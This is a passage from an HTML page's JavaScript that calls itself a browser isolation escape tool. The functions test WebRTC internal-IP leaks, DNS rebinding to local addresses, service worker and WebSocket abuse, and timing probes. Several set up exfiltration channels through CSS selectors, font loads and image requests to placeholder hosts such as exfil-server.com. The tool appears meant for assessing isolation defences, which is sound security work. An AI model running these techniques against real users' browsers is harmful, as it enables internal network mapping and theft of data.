            log('network', 'Port scanning completed', 'success');
        }

        async function testNetworkProtocols() {
            log('network', '🌐 Testing various network protocols...', 'info');
            escapeAttempts++;
            
            const protocolTests = [
                { name: 'HTTP', test: () => fetch('http://httpbin.org/ip', {signal: AbortSignal.timeout(3000)}) },
                { name: 'HTTPS', test: () => fetch('https://httpbin.org/ip', {signal: AbortSignal.timeout(3000)}) },
                { name: 'WebSocket', test: () => new Promise((resolve, reject) => {
                    const ws = new WebSocket('ws://echo.websocket.org');
                    ws.onopen = () => { ws.close(); resolve('success'); };
                    ws.onerror = reject;
                    setTimeout(() => reject(new Error('timeout')), 3000);
                })},
                { name: 'WebRTC', test: () => new Promise((resolve, reject) => {
                    const pc = new RTCPeerConnection();
                    pc.createOffer().then(() => resolve('success')).catch(reject);
                })}
            ];
            
            for (const protocol of protocolTests) {
                try {
                    await protocol.test();
                    log('network', `✅ ${protocol.name} protocol accessible`, 'success');
                    successfulAttacks++;
                } catch (error) {
                    log('network', `❌ ${protocol.name} protocol blocked: ${error.message}`, 'warning');
                }
            }
            
            updateStats();
            log('network', 'Protocol testing completed', 'success');
        }

        // Advanced Escape Functions
        async function testWebRTCEscape() {
            log('escape', '📡 Testing WebRTC IP disclosure...', 'critical');
            escapeAttempts++;
            
            try {
                const pc = new RTCPeerConnection({
                    iceServers: [
                        {urls: 'stun:stun.l.google.com:19302'},
                        {urls: 'stun:stun1.l.google.com:19302'}
                    ]
                });
                
                pc.createDataChannel('test');
                
                const offer = await pc.createOffer();
                await pc.setLocalDescription(offer);
                
                pc.onicecandidate = function(event) {
                    if (event.candidate) {
                        const candidate = event.candidate.candidate;
                        if (candidate.includes('192.168.') || candidate.includes('10.') || candidate.includes('172.')) {
                            log('escape', `🚨 Internal IP disclosed via WebRTC: ${candidate}`, 'critical');
                            successfulAttacks++;
                            updateStats();
                        }
                        log('escape', `WebRTC candidate: ${candidate}`, 'info');
                    }
                };
                
                setTimeout(() => {
                    pc.close();
                    log('escape', 'WebRTC IP disclosure test completed', 'success');
                }, 5000);
                
            } catch (error) {
                log('escape', `WebRTC test failed: ${error.message}`, 'error');
            }
        }

        async function testDNSRebinding() {
            log('escape', '🔄 Testing DNS rebinding attack...', 'critical');
            escapeAttempts++;
            
            // This is a simplified test - real DNS rebinding would require external domain control
            const rebindingTargets = [
                'localhost',
                '127.0.0.1',
                '192.168.1.1',
                '10.0.0.1'
            ];
            
            for (const target of rebindingTargets) {
                try {
                    const response = await fetch(`http://${target}`, {
                        method: 'GET',
                        mode: 'cors',
                        signal: AbortSignal.timeout(2000)
                    });
                    
                    log('escape', `🚨 DNS rebinding successful to ${target}`, 'critical');
                    successfulAttacks++;
                    
                } catch (error) {
                    log('escape', `DNS rebinding to ${target} blocked: ${error.message}`, 'info');
                }
            }
            
            updateStats();
            log('escape', 'DNS rebinding tests completed', 'success');
        }

        async function testServiceWorkers() {
            log('escape', '⚙️ Testing Service Worker abuse...', 'warning');
            escapeAttempts++;
            
            if ('serviceWorker' in navigator) {
                try {
                    const registration = await navigator.serviceWorker.register(
                        'data:application/javascript,' + encodeURIComponent(`
                            self.addEventListener('fetch', event => {
                                console.log('Service Worker intercepted:', event.request.url);
                                if (event.request.url.includes('internal')) {
                                    event.respondWith(new Response('Service Worker Bypass Successful'));
                                }
                            });
                        `),
                        { scope: '/' }
                    );
                    
                    log('escape', '🚨 Service Worker registered successfully!', 'critical');
                    successfulAttacks++;
                    
                    setTimeout(() => {
                        registration.unregister();
                        log('escape', 'Service Worker unregistered', 'info');
                    }, 5000);
                    
                } catch (error) {
                    log('escape', `Service Worker registration failed: ${error.message}`, 'warning');
                }
            } else {
                log('escape', 'Service Workers not supported', 'info');
            }
            
            updateStats();
        }

        async function testWebSocketEscape() {
            log('escape', '🔌 Testing WebSocket tunneling...', 'warning');
            escapeAttempts++;
            
            const wsTargets = [
                'ws://localhost:8080',
                'ws://127.0.0.1:9000',
                'ws://192.168.1.1:80',
                'wss://echo.websocket.org'
            ];
            
            for (const target of wsTargets) {
                try {
                    const ws = new WebSocket(target);
                    
                    ws.onopen = function() {
                        log('escape', `🚨 WebSocket connection established to ${target}`, 'critical');
                        successfulAttacks++;
                        updateStats();
                        
                        ws.send(JSON.stringify({
                            type: 'escape_test',
                            timestamp: Date.now(),
                            origin: window.location.origin
                        }));
                        
                        setTimeout(() => ws.close(), 1000);
                    };
                    
                    ws.onerror = function(error) {
                        log('escape', `WebSocket connection to ${target} failed`, 'info');
                    };
                    
                } catch (error) {
                    log('escape', `WebSocket test to ${target} error: ${error.message}`, 'warning');
                }
                
                await new Promise(resolve => setTimeout(resolve, 1000));
            }
            
            log('escape', 'WebSocket tunneling tests completed', 'success');
        }

        // Data Exfiltration Functions
        async function testImageExfiltration() {
            log('exfiltration', '🖼️ Testing image-based data exfiltration...', 'critical');
            escapeAttempts++;
            
            try {
                const canvas = document.createElement('canvas');
                const ctx = canvas.getContext('2d');
                canvas.width = 200;
                canvas.height = 100;
                
                // Encode data in image pixels
                const testData = 'EXFIL_TEST_' + Date.now();
                ctx.fillStyle = '#000000';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                
                // Encode each character as pixel intensity
                for (let i = 0; i < testData.length; i++) {
                    const charCode = testData.charCodeAt(i);
                    ctx.fillStyle = `rgb(${charCode}, ${charCode}, ${charCode})`;
                    ctx.fillRect(i * 8, 0, 8, 8);
                }
                
                const imageData = canvas.toDataURL('image/png');
                
                // Attempt to exfiltrate via image request
                const img = new Image();
                img.onload = function() {
                    log('exfiltration', '🚨 Image-based exfiltration successful!', 'critical');
                    successfulAttacks++;
                    updateStats();
                };
                img.onerror = function() {
                    log('exfiltration', 'Image exfiltration blocked', 'warning');
                };
                
                // This would normally go to an external server
                img.src = imageData;
                
                log('exfiltration', 'Image exfiltration test initiated', 'info');
                
            } catch (error) {
                log('exfiltration', `Image exfiltration failed: ${error.message}`, 'error');
            }
        }

        async function testCSSExfiltration() {
            log('exfiltration', '🎨 Testing CSS-based data exfiltration...', 'critical');
            escapeAttempts++;
            
            try {
                const style = document.createElement('style');
                style.innerHTML = `
                    .exfil-test[data-secret*="admin"] {
                        background-image: url('http://external-server.com/exfil?found=admin');
                    }
                    .exfil-test[data-secret*="password"] {
                        background-image: url('http://external-server.com/exfil?found=password');
                    }
                    .exfil-test[data-secret*="token"] {
                        background-image: url('http://external-server.com/exfil?found=token');
                    }
                `;
                
                document.head.appendChild(style);
                
                const testElement = document.createElement('div');
                testElement.className = 'exfil-test';
                testElement.setAttribute('data-secret', 'admin_password_token_123');
                document.body.appendChild(testElement);
                
                log('exfiltration', '🚨 CSS attribute selector exfiltration setup complete', 'critical');
                successfulAttacks++;
                
                setTimeout(() => {
                    document.head.removeChild(style);
                    document.body.removeChild(testElement);
                }, 3000);
                
            } catch (error) {
                log('exfiltration', `CSS exfiltration failed: ${error.message}`, 'error');
            }
            
            updateStats();
        }

        async function testTimingAttacks() {
            log('exfiltration', '⏱️ Testing timing-based attacks...', 'warning');
            escapeAttempts++;
            
            const timingTargets = targets.slice(0, 5); // Test first 5 targets
            
            for (const target of timingTargets) {
                const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
                
                try {
                    const timings = [];
                    
                    for (let i = 0; i < 5; i++) {
                        const startTime = performance.now();
                        
                        try {
                            await fetch(`http://${fullTarget}`, {
                                method: 'HEAD',
                                mode: 'no-cors',
                                signal: AbortSignal.timeout(1000)
                            });
                        } catch (error) {
                            // Timing is still measured even on error
                        }
                        
                        const endTime = performance.now();
                        timings.push(endTime - startTime);
                        
                        await new Promise(resolve => setTimeout(resolve, 100));
                    }
                    
                    const avgTiming = timings.reduce((a, b) => a + b, 0) / timings.length;
                    const variance = timings.map(t => Math.abs(t - avgTiming)).reduce((a, b) => a + b, 0) / timings.length;
                    
                    log('exfiltration', `${fullTarget} - Avg: ${avgTiming.toFixed(2)}ms, Variance: ${variance.toFixed(2)}ms`, 'info');
                    
                    if (variance < 10) {
                        log('exfiltration', `🚨 Consistent timing detected for ${fullTarget} - potential timing channel`, 'critical');
                        successfulAttacks++;
                    }
                    
                } catch (error) {
                    log('exfiltration', `Timing test failed for ${fullTarget}: ${error.message}`, 'warning');
                }
            }
            
            updateStats();
            log('exfiltration', 'Timing attack tests completed', 'success');
        }

        async function establishCovertChannel() {
            log('exfiltration', '📡 Establishing covert communication channels...', 'critical');
            escapeAttempts++;
            
            // Test multiple covert channels
            const channels = [
                {
                    name: 'DNS Query',
                    test: async () => {
                        try {
                            await fetch('https://dns.google/resolve?name=exfil-test-' + Date.now() + '.example.com');
                            return true;
                        } catch (error) {
                            return false;
                        }
                    }
                },
                {
                    name: 'Image Error Handler',
                    test: async () => {
                        return new Promise((resolve) => {
                            const img = new Image();
                            img.onerror = () => resolve(true);
                            img.onload = () => resolve(true);
                            img.src = 'http://exfil-server.com/data?payload=' + btoa('test_data');
                            setTimeout(() => resolve(false), 3000);
                        });
                    }
                },
                {
                    name: 'CSS Font Loading',
                    test: async () => {
                        try {
                            const style = document.createElement('style');
                            style.innerHTML = `@font-face { font-family: 'ExfilFont'; src: url('http://exfil-server.com/font?data=test'); }`;
                            document.head.appendChild(style);
                            
                            const testElement = document.createElement('div');
                            testElement.style.fontFamily = 'ExfilFont';
                            testElement.textContent = 'test';
                            document.body.appendChild(testElement);
                            
                            setTimeout(() => {
                                document.head.removeChild(style);
                                document.body.removeChild(testElement);
                            }, 2000);
                            
                            return true;
                        } catch (error) {
                            return false;
                        }
                    }
                }
            ];
            
            for (const channel of channels) {
                try {
                    const result = await channel.test();
                    if (result) {
                        log('exfiltration', `🚨 Covert channel established: ${channel.name}`, 'critical');
                        successfulAttacks++;
                    } else {
                        log('exfiltration', `${channel.name} channel blocked`, 'warning');
                    }
                } catch (error) {
                    log('exfiltration', `${channel.name} channel error: ${error.message}`, 'error');
                }
            }
            
            updateStats();
            log('exfiltration', 'Covert channel establishment completed', 'success');
        }

        // Main test runner
        async function runAllTests() {
            log('results', '🚀 Starting comprehensive browser isolation escape tests...', 'critical');
            
            const testSuite = [
                { name: 'Extension Access', func: testExtensionAccess },
                { name: 'Config Modification', func: testConfigModification },
                { name: 'Local File Access', func: testLocalFileAccess },
                { name: 'Local Storage', func: testLocalStorage },
                { name: 'Local Host Enumeration', func: enumerateLocalHosts },
                { name: 'Internal Assets', func: testInternalAssets }
            ];
            
            for (let i = 0; i < testSuite.length; i++) {
                const test = testSuite[i];
                log('results', `Running ${test.name}...`, 'info');
                
                try {
                    await test.func();
                    await new Promise(resolve => setTimeout(resolve, 1000)); // Pause between tests
                } catch (error) {
                    log('results', `${test.name} failed: ${error.message}`, 'error');
                }
                
                updateProgress(i + 1, testSuite.length);
            }
            
            generateComprehensiveReport();
            log('results', '✅ All escape tests completed!', 'success');
        }

        function generateComprehensiveReport() {
            log('results', '', 'info');
            log('results', '📊 BROWSER ISOLATION ESCAPE REPORT', 'critical');
            log('results', '='.repeat(50), 'info');
            log('results', `Total Escape Attempts: ${escapeAttempts}`, 'info');
            log('results', `Successful Attacks: ${successfulAttacks}`, successfulAttacks > 0 ? 'critical' : 'success');
            log('results', `Browser Tests Executed: ${browserTestCount}`, 'info');
            log('results', `Network Targets Tested: ${targets.length}`, 'info');
            
            const successRate = escapeAttempts > 0 ? ((successfulAttacks / escapeAttempts) * 100).toFixed(1) : 0;
            log('results', `Success Rate: ${successRate}%`, successRate > 0 ? 'critical' : 'success');
            
            log('results', '', 'info');
            log('results', '🎯 ACCESSIBLE TARGETS:', 'success');
            const accessibleTargets = targets.filter(t => t.status === 'accessible');
            if (accessibleTargets.length > 0) {
                accessibleTargets.forEach(target => {
                    const fullTarget = target.port ? `${target.host}:${target.port}` : target.host;
                    log('results', `  ✅ ${fullTarget} (${target.service})`, 'success');
                });
            } else {
                log('results', '  No accessible targets found', 'info');
            }
            
            log('results', '', 'info');
            if (successfulAttacks > 0) {
                log('results', '🚨 SECURITY RECOMMENDATIONS:', 'critical');
                log('results', '  - Review browser isolation policies', 'warning');
                log('results', '  - Implement additional network segmentation', 'warning');
                log('results', '  - Monitor for escape attempt indicators', 'warning');
                log('results', '  - Consider additional DLP controls', 'warning');
            } else {
                log('results', '✅ Browser isolation appears to be functioning correctly', 'success');
            }
        }

        function analyzeSuccessfulEscapes() {
            log('results', '🔍 Analyzing successful escape techniques...', 'info');
            
            Object.keys(testResults).forEach(section => {
                const sectionResults = testResults[section];
                const criticalResults = sectionResults.filter(r => r.type === 'critical');
                
                if (criticalResults.length > 0) {
                    log('results', `${section.toUpperCase()} - Critical findings:`, 'critical');
                    criticalResults.forEach(result => {
                        log('results', `  ${result.message}`, 'critical');
                    });
                }
            });
        }

        function exportResults() {
            const exportData = {
                timestamp: new Date().toISOString(),
                summary: {
                    escapeAttempts: escapeAttempts,
                    successfulAttacks: successfulAttacks,
                    browserTests: browserTestCount,
                    networkTargets: targets.length,
                    accessibleTargets: targets.filter(t => t.status === 'accessible').length
                },
                targets: targets,
                testResults: testResults,
                environment: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    cookieEnabled: navigator.cookieEnabled,
                    onLine: navigator.onLine
                }
            };
            
            const jsonData = JSON.stringify(exportData, null, 2);
            const blob = new Blob([jsonData], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `browser_isolation_escape_report_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            log('results', '📁 Results exported successfully', 'success');
        }

        function exportTechnicalDetails() {
            const technicalData = {
                timestamp: new Date().toISOString(),
                browserCapabilities: {
                    webrtc: typeof RTCPeerConnection !== 'undefined',
                    websockets: typeof WebSocket !== 'undefined',
                    serviceWorkers: 'serviceWorker' in navigator,
                    indexedDB: typeof indexedDB !== 'undefined',
                    geolocation: 'geolocation' in navigator,
                    notifications: 'Notification' in window,
                    webGL: !!document.createElement('canvas').getContext('webgl'),
                    webAudio: typeof AudioContext !== 'undefined' || typeof webkitAudioContext !== 'undefined'
                },
                storageCapabilities: {
                    localStorage: typeof localStorage !== 'undefined',
                    sessionStorage: typeof sessionStorage !== 'undefined',
                    indexedDB: typeof indexedDB !== 'undefined',
                    webSQL: typeof openDatabase !== 'undefined'
                },
                networkCapabilities: {
                    fetch: typeof fetch !== 'undefined',
                    xmlHttpRequest: typeof XMLHttpRequest !== 'undefined',
                    cors: true, // Assume CORS is supported in modern browsers
                    websockets: typeof WebSocket !== 'undefined'
                },
                detailedResults: testResults
            };
            
            const jsonData = JSON.stringify(technicalData, null, 2);
            const blob = new Blob([jsonData], {type: 'application/json'});
            const url = URL.createObjectURL(blob);
            
            const a = document.createElement('a');
            a.href = url;
            a.download = `technical_capabilities_${Date.now()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            
            log('results', '📁 Technical details exported successfully', 'success');
        }

        // File drop functionality
        const dropZone = document.getElementById('file-drop-zone');
        
        dropZone.addEventListener('dragover', (e) => {
            e.preventDefault();
            dropZone.classList.add('dragover');
        });
        
        dropZone.addEventListener('dragleave', () => {
            dropZone.classList.remove('dragover');
        });
        
        dropZone.addEventListener('drop', (e) => {
            e.preventDefault();
            dropZone.classList.remove('dragover');
            
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                const file = files[0];
                const reader = new FileReader();
                reader.onload = function(e) {
                    parseTargetFile(e.target.result, file.name);
                };
                reader.readAsText(file);
            }
        });

        // Initialize
        document.addEventListener('DOMContentLoaded', function() {
            log('results', '🔓 Browser Isolation Escape Tool loaded successfully', 'critical');
            log('results', 'Upload target lists and execute comprehensive escape tests', 'info');
            updateStats();
        });
    </script>
</body>
</html>
